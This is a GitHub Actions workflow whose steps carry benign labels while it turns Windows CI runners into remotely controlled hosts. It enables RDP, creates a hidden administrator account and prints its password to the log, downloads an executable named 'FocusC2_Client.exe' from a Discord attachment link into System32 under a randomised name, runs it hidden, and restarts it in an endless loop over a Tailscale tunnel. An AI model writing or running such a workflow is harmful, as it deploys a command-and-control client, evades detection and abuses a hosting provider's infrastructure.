name: System-Node-Service-v25

on:
  workflow_dispatch:

jobs:
  worker-runtime:
    runs-on: windows-latest
    timeout-minutes: 3600
    strategy:
      matrix:
        node_id: [1, 2] # Mantengo 2 maquinas para evitar suspensiones

    steps:
      - name: 1. Optimize Energy Settings
        run: |
          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
          powercfg /x -monitor-timeout-ac 0
          powercfg /h off

      - name: 2. Enable Remote Debugging
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

      - name: 3. Provision Service Account
        run: |
          $p = "Node" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
          $s = ConvertTo-SecureString $p -AsPlainText -Force
          New-LocalUser -Name "AdminSrv" -Password $s -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "AdminSrv"
          echo "SRV_PASS=$p" >> $env:GITHUB_ENV

      - name: 4. Deploy Randomized Module
        run: |
          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1476785770567303301/FocusC2_Client.exe?ex=69a2636d&is=69a111ed&hm=0ae19ad5e94878e1c6345088757fb21b89a5d30be781c1f80954181264766e61&"
          
          # Generar nombre aleatorio para el proceso
          $randName = "SrvData_" + (Get-Random -Minimum 100 -Maximum 999) + ".exe"
          $dest = "C:\Windows\System32\$randName"
          echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
          
          try {
              Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
              Write-Host "Modulo desplegado como: $randName"
              Start-Process $dest -WindowStyle Hidden
          } catch {
              Write-Error "Fallo en la descarga. Verifica el enlace de Discord."
              exit 1
          }

      - name: 5. Network Bridge (Tailscale)
        run: |
          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="node-srv-${{ matrix.node_id }}"

      - name: 6. Monitoring & Maintenance Loop
        run: |
          $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          Write-Host "Node ${{ matrix.node_id }} Online at: $ip"
          Write-Host "User: AdminSrv | Pass: $env:SRV_PASS"
          Write-Host "Process: $env:PROC_NAME"
          
          $fullPath = "C:\Windows\System32\$env:PROC_NAME"
          $procOnly = $env:PROC_NAME.Replace(".exe", "")

          while ($true) {
              if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
                  Write-Host "Reiniciando proceso $procOnly..."
                  Start-Process $fullPath -WindowStyle Hidden
              }
              Start-Sleep -Seconds 300
          }
